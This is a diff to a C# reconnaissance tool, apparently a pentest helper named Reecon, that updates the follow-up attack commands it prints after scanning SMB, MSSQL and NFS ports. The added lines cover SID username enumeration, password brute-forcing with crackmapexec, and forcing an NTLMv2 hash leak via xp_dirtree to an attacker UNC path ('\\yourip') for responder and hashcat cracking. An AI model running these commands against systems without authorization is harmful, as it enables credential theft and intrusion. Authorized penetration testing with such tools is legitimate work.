@@ -6,6 +6,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Reflection;
+using System.Security.Cryptography;
 
 namespace Reecon
 {
@@ -510,19 +511,23 @@ namespace Reecon
                     postScanActions += $"- Port 445 - Linux (SMBClient) has better info on this: smbclient -L {target} --no-pass" + Environment.NewLine;
                 }
                 postScanActions += $"- Port 445 - I miss a lot: nmap -sC -sV -p445 {target}" + Environment.NewLine;
+                postScanActions += $"- Port 445 - Unauthenticated SID (Username) Lookup: lookupsid.py anonymous@{target} -no-pass | grep -e \"Brute forcing\" -e SidTypeUser" + Environment.NewLine;
+                postScanActions += $"- Port 445 - Authenticated SID Lookup: lookupsid.py DOMAIN/Username:password@{target}" + Environment.NewLine;
                 postScanActions += $"- Port 445 - Testing passwords: crackmapexec smb {target} -u users.txt -p passwords.txt" + Environment.NewLine;
                 postScanActions += $"- Port 445 - List Shares: smbclient -L //{target} -U validusername%validpass" + Environment.NewLine;
                 postScanActions += $"- Port 445 - Connect Share: smbclient -U validusername%validpass //{target}/shareName" + Environment.NewLine;
-                postScanActions += $"- Port 445 - Authenticated SID Lookup: sudo lookupsid.py DOMAIN/Username:password@{target}" + Environment.NewLine;
             }
             else if (port == 1433)
             {
                 postScanActions += $"- MSSQL - Nmap has more: sudo nmap {target} -p 1433 --script ms-sql-info" + Environment.NewLine;
-                postScanActions += @"- MSSQL - If you connect, run responder, and try get the NTLMv2 hash: exec xp_dirtree '\\yourip\anythinghere'" + Environment.NewLine;
+                postScanActions += $"- MSSQL - Brute force creds: crackmapexec mssql {target} -u users.txt -p pass.txt" + Environment.NewLine;
+                postScanActions += $"- MSSQL - Connect: mssqlclient.py (-windows-auth is optional, but can be required) {target}/userHere:passHere@{target}" + Environment.NewLine;
+                postScanActions += @"- MSSQL - If you connect, run responder, and try get the NTLMv2 hash: exec xp_dirtree '\\yourip\anythinghere' (hashcat -m 5600 - NOT -ssp hashes)" + Environment.NewLine;
+                postScanActions += @"- MSSQL - Explore the file system: exec xp_dirtree 'C:\',1,1" + Environment.NewLine;
             }
             else if (port == 2049)
             {
-                postScanActions += "- NFS: rpcinfo -p " + target + Environment.NewLine;
+                postScanActions += " - NFS: rpcinfo -p " + target + Environment.NewLine;
             }
             else if (port == 3128)
             {
